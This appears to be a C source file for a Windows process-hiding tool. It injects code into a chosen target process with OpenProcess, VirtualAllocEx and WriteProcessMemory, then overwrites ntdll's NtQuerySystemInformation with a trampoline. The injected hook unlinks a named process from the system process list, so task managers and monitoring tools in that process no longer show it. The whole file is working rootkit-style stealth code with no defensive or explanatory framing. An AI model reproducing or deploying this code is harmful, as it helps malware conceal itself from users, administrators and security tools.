#include "ProcessStealth.h"

NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DWORD SearchOverwriteOffset(PVOID Address);
int AtherFunc();

DWORD GetProcessIdByImageName(wchar_t *ProcessName)
{
    PSYSTEM_PROCESS_INFORMATION spi;
    DWORD PID = NULL;
    ULONG ReturnLength;

    while (TRUE)
    {
        if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength) != STATUS_INFO_LENGTH_MISMATCH)
        {
            continue;
        }

        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (spi == NULL)
        {
            continue;
        }

        if (NT_SUCCESS(NtQuerySystemInformation(SystemProcessInformation, spi, ReturnLength, &ReturnLength)))
        {
            break;
        }

        VirtualFree(spi, 0, MEM_RELEASE);
    }

    PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;

    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, ProcessName) == 0)
        {
            PID = spi->UniqueProcessId;
            break;
        }

        if (spi->NextEntryOffset == 0)
            break;

        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }

    VirtualFree(temp, ReturnLength, MEM_DECOMMIT);
    VirtualFree(temp, 0, MEM_RELEASE);

    return PID;
}

BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
{
    BYTE Syscall[16] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3};

    BYTE TrampolineCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

    printf("[*] Search %S PID\n", TargetProcessName);

    DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);

    static DWORD PrevPID = NULL;

    if (TargetPID == NULL)
    {
        printf("[-] %S Not found!\n", TargetProcessName);
        return FALSE;
    }

    if (TargetPID == PrevPID)
    {
        printf("[-] It was hooked!\n");
        return FALSE;
    }

    PrevPID = TargetPID;

    PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    printf("[*] NtQuerySystemInformation : 0x%p\n", NtQuerySystemInformation);

    printf("[*] Target Process Name : %S\n", TargetProcessName);
    printf("[*]  Hide Process Name  : %S\n", HideProcessName);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    if (hProcess == NULL)
    {
        printf("[-] OpenProcess Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    PVOID NewFunction = VirtualAllocEx(hProcess, NULL, NewNtQuerySystemInformation_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (NewFunction == NULL)
    {
        printf("[-] VirtualAllocEx Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Hook Function Address : 0x%p\n", NewFunction);

    memcpy(TrampolineCode + 2, &NewFunction, 8);

    SIZE_T NumberOfBytesWritten;

    if (WriteProcessMemory(hProcess, NewFunction, NewNtQuerySystemInformation, NewNtQuerySystemInformation_Size, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Write NewNtQuerySystemInformation\n");
    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);

    DWORD SystemCallNumber = *(DWORD *)((ULONGLONG)NtQuerySystemInformation + 4);

    printf("[*] NtQuerySystemInformation Call Number : %d\n", SystemCallNumber);

    memcpy(Syscall + 4, &SystemCallNumber, 4);

    PVOID SyscallClone = (ULONGLONG)NewFunction + NewNtQuerySystemInformation_Size;

    if (WriteProcessMemory(hProcess, SyscallClone, Syscall, 16, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Cloning NtQuerySystemInformation\n");

    PVOID ProcessName = (ULONGLONG)SyscallClone + 16;

    if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName) * 2, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Wrtie hide process name\n");
    printf("[+] Write By %d Byte\n", NumberOfBytesWritten);

    if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Set clone NtQuerySystemInformatino and hide process name\n");

    /*if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }*/

    DWORD OldProtect;

    if (VirtualProtectEx(hProcess, NtQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &OldProtect) == FALSE)
    {
        printf("[-] VirtualProtectEx Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Release protect NtQuerySystemInformation\n");

    if (WriteProcessMemory(hProcess, NtQuerySystemInformation, TrampolineCode, 12, &NumberOfBytesWritten) == FALSE)
    {
        printf("[-] WriteProcessMemory Failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return FALSE;
    }

    printf("[*] Success hide!\n");
}

DWORD SearchOverwriteOffset(PVOID Address)
{
    ULONGLONG Pointer_Overwrite = 0xCCCCCCCCCCCCCCCC;
    for (int i = 0;; i++)
    {
        if (memcmp((ULONGLONG)Address + i, &Pointer_Overwrite, 8) == 0)
        {
            return i;
        }
    }
}

NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    volatile NTSTATUS *CloneNtQuerySystemInformation = 0xCCCCCCCCCCCCCCCC;
    wchar_t *HideProcessName = (ULONGLONG)CloneNtQuerySystemInformation + 16;
    NTSTATUS ntstatus = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength))CloneNtQuerySystemInformation)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (ntstatus != STATUS_SUCCESS)
    {
        return ntstatus;
    }

    if (SystemInformationClass == 5)
    {
        PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = pCur;
        pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;

        while (TRUE)
        {
            // ===================wcsicmp===================
            wchar_t s1, s2;
            BOOL ret = TRUE;

            for (int i = 0; (*(HideProcessName + i) != NULL) && (*(pCur->ImageName.Buffer + i) != NULL); i++)
            {
                s1 = Lower(*(HideProcessName + i));
                s2 = Lower(*(pCur->ImageName.Buffer + i));
                ret = (s1 == s2) ? TRUE : FALSE;
                if (ret == FALSE)
                    break;
            }
            // =============================================
            // ================manipulation=================
            if (ret)
            {
                if (pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
            }
            else
                pPrev = pCur;
            // =============================================
            // ==============check last list================
            if (pCur->NextEntryOffset == 0)
                break;
            // =============================================
            // ============change next object===============
            pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
            // =============================================
        }
    }

    return ntstatus;
}
int AtherFunc() {}